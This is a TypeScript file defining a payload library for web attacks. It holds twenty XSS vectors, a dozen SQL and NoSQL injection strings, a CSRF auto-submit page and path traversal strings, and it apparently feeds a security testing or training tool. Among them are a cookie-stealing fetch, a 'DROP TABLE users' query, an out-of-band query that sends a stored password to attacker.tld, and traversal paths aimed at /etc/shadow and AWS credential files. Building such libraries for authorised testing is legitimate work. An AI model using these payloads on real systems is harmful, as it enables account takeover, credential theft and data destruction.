export interface PayloadLibraryItem {
  id: string
  type: 'xss' | 'sqli' | 'csrf' | 'path'
  title: string
  payload: string
  note: string
}

export const payloadLibrary: PayloadLibraryItem[] = [
  { id: 'x1', type: 'xss', title: 'Basic script tag', payload: '<script>alert(1)</script>', note: 'Reflected XSS baseline payload.' },
  { id: 'x2', type: 'xss', title: 'Image onerror', payload: '<img src=x onerror=alert(document.domain)>', note: 'Useful when script tags are filtered but event handlers survive.' },
  { id: 'x3', type: 'xss', title: 'SVG onload', payload: '<svg/onload=alert(1)>', note: 'Common filter bypass in permissive HTML contexts.' },
  { id: 'x4', type: 'xss', title: 'Anchor javascript', payload: '<a href=javascript:alert(1)>click</a>', note: 'Tests URL-based execution handling.' },
  { id: 'x5', type: 'xss', title: 'Iframe srcdoc', payload: '<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>', note: 'Interesting when nested HTML contexts are allowed.' },
  { id: 'x6', type: 'xss', title: 'Body onload', payload: '<body onload=alert(1)>', note: 'Legacy parser edge-case payload.' },
  { id: 'x7', type: 'xss', title: 'Template injection feeler', payload: '{{constructor.constructor(\"alert(1)\")()}}', note: 'Not classic XSS, but useful as a client-template probe.' },
  { id: 'x8', type: 'xss', title: 'Encoded script', payload: '%3Cscript%3Ealert(1)%3C/script%3E', note: 'Tests URL decoding before rendering.' },
  { id: 'x9', type: 'xss', title: 'Input autofocus', payload: '<input autofocus onfocus=alert(1)>', note: 'Execution without explicit clicks.' },
  { id: 'x10', type: 'xss', title: 'MathML vector', payload: '<math><mtext><img src=x onerror=alert(1)></mtext></math>', note: 'Exotic namespace trick.' },
  { id: 'x11', type: 'xss', title: 'Cookie exfil simulation', payload: '<script>fetch(\"/steal?c=\"+document.cookie)</script>', note: 'For educational cookie theft demonstration.' },
  { id: 'x12', type: 'xss', title: 'DOM sink assignment', payload: '"><script>document.body.innerHTML=location.hash</script>', note: 'Used to show DOM-based propagation.' },
  { id: 'x13', type: 'xss', title: 'Srcset trick', payload: '<img srcset=x onerror=alert(1)>', note: 'Parser behavior test.' },
  { id: 'x14', type: 'xss', title: 'Details toggle', payload: '<details open ontoggle=alert(1)>', note: 'HTML5 event-based vector.' },
  { id: 'x15', type: 'xss', title: 'Marquee start', payload: '<marquee onstart=alert(1)>', note: 'Legacy tag demonstration.' },
  { id: 'x16', type: 'xss', title: 'Video onerror', payload: '<video><source onerror=\"javascript:alert(1)\">', note: 'Media event example.' },
  { id: 'x17', type: 'xss', title: 'Meta refresh', payload: '<meta http-equiv=\"refresh\" content=\"0;javascript:alert(1)\">', note: 'Shows dangerous parser-specific behavior.' },
  { id: 'x18', type: 'xss', title: 'Object data URI', payload: '<object data=\"javascript:alert(1)\">', note: 'Embedded content sink.' },
  { id: 'x19', type: 'xss', title: 'Textarea break-out', payload: '</textarea><script>alert(1)</script>', note: 'Context break-out payload.' },
  { id: 'x20', type: 'xss', title: 'Comment break-out', payload: '--><script>alert(1)</script>', note: 'HTML comment termination vector.' },
  { id: 's1', type: 'sqli', title: 'Boolean auth bypass', payload: `' OR '1'='1`, note: 'Classic authentication bypass.' },
  { id: 's2', type: 'sqli', title: 'Comment truncation', payload: `' OR 1=1 -- `, note: 'Ignores trailing query logic.' },
  { id: 's3', type: 'sqli', title: 'UNION schema dump', payload: `' UNION SELECT table_name, column_name FROM information_schema.columns -- `, note: 'Schema extraction simulation.' },
  { id: 's4', type: 'sqli', title: 'Error-based', payload: `' AND updatexml(1,concat(0x7e,user(),0x7e),1) -- `, note: 'MySQL error leak example.' },
  { id: 's5', type: 'sqli', title: 'Time-based blind', payload: `' OR IF(1=1,SLEEP(5),0) -- `, note: 'Blind boolean/time-based path.' },
  { id: 's6', type: 'sqli', title: 'Stacked DROP', payload: `'; DROP TABLE users; -- `, note: 'Destructive stacked DDL.' },
  { id: 's7', type: 'sqli', title: 'OOB exfil (MySQL FILE)', payload: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.tld\\\\a')) -- `, note: 'Out-of-band DNS/SMB exfiltration via LOAD_FILE.' },
  { id: 's8', type: 'sqli', title: 'ORDER BY enum', payload: `' ORDER BY 10 -- `, note: 'Column count enumeration before UNION.' },
  { id: 's9', type: 'sqli', title: 'PG pg_sleep', payload: `'; SELECT pg_sleep(5) -- `, note: 'PostgreSQL time-based.' },
  { id: 's10', type: 'sqli', title: 'MSSQL WAITFOR', payload: `'; WAITFOR DELAY '00:00:05' -- `, note: 'MSSQL time-based.' },
  { id: 's11', type: 'sqli', title: 'NoSQL $ne bypass', payload: `{"email": {"$ne": null}, "password": {"$ne": null}}`, note: 'MongoDB operator injection.' },
  { id: 's12', type: 'sqli', title: 'NoSQL $where RCE feeler', payload: `{"$where": "this.password.length > 0"}`, note: 'Server-side JS evaluation in Mongo.' },
  { id: 'c1', type: 'csrf', title: 'Auto-submit form', payload: '<form action=\"/transfer\" method=\"POST\"><input name=\"amount\" value=\"10000\"></form><script>document.forms[0].submit()</script>', note: 'Classic CSRF attack page.' },
  { id: 'p1', type: 'path', title: 'Unix passwd', payload: '../../etc/passwd', note: 'Canonical path traversal sample.' },
  { id: 'p2', type: 'path', title: 'Encoded traversal', payload: '..%2f..%2f..%2fetc%2fshadow', note: 'URL-encoded bypass variant.' },
  { id: 'p3', type: 'path', title: 'Double-encoded', payload: '..%252f..%252fetc%252fpasswd', note: 'Double URL encoding bypass.' },
  { id: 'p4', type: 'path', title: 'Overlong UTF-8', payload: '..%c0%af..%c0%afetc%c0%afpasswd', note: 'Non-canonical UTF-8 bypass.' },
  { id: 'p5', type: 'path', title: 'Null byte truncation', payload: '../../etc/passwd%00.png', note: 'Null byte to bypass extension check.' },
  { id: 'p6', type: 'path', title: 'AWS credentials', payload: '../../home/admin/.aws/credentials', note: 'Cloud creds exfiltration target.' },
  { id: 'p7', type: 'path', title: 'Proc environ', payload: '../../../proc/self/environ', note: 'Linux process env leak.' }
]
